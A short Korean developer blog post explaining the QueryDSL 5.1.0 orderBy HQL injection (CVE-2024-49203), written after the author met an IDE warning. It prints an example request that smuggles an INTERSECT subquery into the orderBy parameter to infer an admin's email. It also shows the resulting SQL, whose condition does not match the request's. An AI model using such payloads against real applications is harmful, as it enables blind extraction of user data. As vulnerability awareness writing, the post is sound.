---
title: 'QueryDSL HQL Injection 취약점(CVE-2024-49203)'
description: 수습기간 이후 새로운 프로젝트를 진행하게 되며 게시판 기능을 구현중 검색 필터와 복잡한 조인 구조의 쿼리 처리를 팀내 백엔드 개발자와 상의하여 가장 익숙하다고 하는 querydsl을 이용하기로 했다.  의존성 추가를 위해 maven repository에서 querydsl 가장 최신 버전을 build.gradle 추가하게 되었으며, 이 과정에서 IDE에서 사용 경고가 발생했다.
categories:
 - Backend
tags:
 - QueryDSL
 - Security
 - Spring Boot
---
수습기간 이후 새로운 프로젝트를 진행하게 되며 게시판 기능을 구현중 검색 필터와 복잡한 조인 구조의 쿼리 처리를 팀내 백엔드 개발자와 상의하여 가장 익숙하다고 하는 querydsl을 이용하기로 했다.

의존성 추가를 위해 maven repository에서 querydsl 가장 최신 버전을 build.gradle 추가하게 되었으며, 이 과정에서 IDE에서 사용 경고가 발생했다.

![Desktop Preview](/assets/images/post/querydsl_hql_injection/querydsl_ide_warning.png)

경고 내용으로는 Querydsl이 orderBy에서의 HQL injection에 취약하다는 내용이다.

내용을 자세히 찾아보니 2024년11월9일 CSIRT.SK에서 QueryDSL 5.1.0에서 HQL Injection 취약점(CVE-2024-49203)을 보고하면서 등록된 경고이다.

**핵심: Order By Injection**
정렬 파라미터에 악의적인 값을 넣으면 임의의 HQL 구문을 실행할 수 있다는 것.

아래와 같이 악의적인 요청을 보냈을 때:
```
GET :8000/products?orderBy=name+INTERSECT+SELECT+t+FROM+Test+t+WHERE+(SELECT+SUBSTRING(email,1,1)+FROM+users+WHERE+username='admin')='a'+ORDER+BY+t.id
```

다음과 같은 네이티브 쿼리로 수행된다.
```sql
(SELECT * FROM test_table t1 ORDER BY t1.name)
INTERSECT
(SELECT * FROM test_table t 
 WHERE (SELECT LENGTH(email) FROM users WHERE username='admin')=17);
```

해당 쿼리의 수행 결과로 데이터가 존재 했을 경우 조건이 참이라는 뜻으로 원래는 데이터를 유추하는게 가능하다는 얘기이다.  
```
HTTP/1.1 200
Content-Type: application/json
Date: Fri, 01 Aug 2025 13:34:57 GMT
Content-Length: 27


[{"id":1,"name":"test123"}]
```

